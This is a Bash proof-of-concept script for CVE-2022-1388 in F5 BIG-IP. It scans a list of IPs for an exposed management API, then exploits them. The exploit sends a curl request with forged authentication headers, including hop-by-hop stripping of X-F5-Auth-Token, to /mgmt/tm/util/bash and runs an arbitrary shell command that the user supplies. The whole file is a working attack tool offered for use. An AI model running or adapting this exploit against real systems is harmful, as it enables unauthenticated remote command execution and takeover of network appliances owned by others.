#!/bin/bash

# Scan and exploit for F5 vuln CVE-2022-1388

# Fail on error
set -o errexit
# Fail on unset var usage
set -o nounset
# Prevents errors in a pipeline from being masked
set -o pipefail
# Disable wildcard character expansion
set -o noglob

# Global Vars
ARG_FILE=""
ARG_PAYLOAD="whoami"
ARG_LOGFILE="PoC_log.txt"

# Print and log
function log() {
	echo "$1" | tee -a "$ARG_LOGFILE"
}

# Function scan
function scan() {
	# Clear log file
	rm -rf "$ARG_LOGFILE"
	# Check for input file
	if [ -z "$ARG_FILE" ]
	then
		log "[ERROR] Must provide MANDATORY File with target IPs" && exit 1
	fi
	# Start scanning
	log "[INFO] Scan the target IPs"
	for ip in `cat $ARG_FILE`
	do
		log "[INFO] Scan IP $ip"
		local response=`curl \
			--insecure \
			--silent \
			--max-time 2 \
			"https://$ip/mgmt/shared/authn/login" | egrep "message|resterrorresponse" | jq`
		if [ -n "$response" ]
		then
			log "[INFO] Host $ip EXPOSES API"
		else
			log "[INFO] Host $ip does NOT exposes API"
		fi
	done
}

# Function exploit
function exploit() {
	# Clear log file
	rm -rf "$ARG_LOGFILE"
	# Check for input file
	if [ -z "$ARG_FILE" ]
	then
		log "[ERROR] Must provide MANDATORY File with target IPs" && exit 1
	fi
	# Start exploiting
	log "[INFO] Exploit the target IPs"
	for ip in `cat $ARG_FILE`
	do
		log "[INFO] Exploit IP $ip"
		local response=`curl \
			--insecure \
			--silent \
			--max-time 2 \
			--header "Host: $ip" \
			--header "Authorization: Basic  YWRtaW46" \
			--header "X-F5-Auth-Token: a" \
			--header "Connection: keep-alive, X-F5-Auth-Token" \
			--header "Content-Type: application/json" \
			--data "{\"command\":\"run\",\"utilCmdArgs\":\"-c $ARG_PAYLOAD\"}" \
			"https://$ip/mgmt/tm/util/bash" | jq`
		log "$response"
	done
}

# Print help message
function printHelp() {
	cat << EOF
Usage: poc.sh [--help] --file FILE --scan --exploit [--payload PAYLOAD] 

F5 PoC script.
One or multiple IPs can be scanned.
Only one IP can be exploited.

Arguments:
  --help                   Show this help message and exit.
  --file FILE              File list containing one or multiple IPs to test.
  --scan                   Scan the target IPs.
  --exploit                Exploit the target IPs.
  --payload PAYLOAD        Payload to be executed (default command "whoami").
EOF
	exit 1
}

# Script entrypoint
function main {
	# Analyze arguments
	while [[ $# -gt 0 ]]; do
		case $1 in
			--help)
				printHelp
			;;
			--file)
				ARG_FILE="$2"
				shift
				shift
			;;
			--scan)
				scan
			;;
			--exploit)
				exploit
			;;
			--payload)
				ARG_PAYLOAD="$2"
				shift
				shift
			;;
			--*)
				log "[ERROR] Unknown argument '$1'" && exit 1
			;;
			*)
				ARGS+=("$1")
				shift
			;;
		esac
	done
}

main "$@"
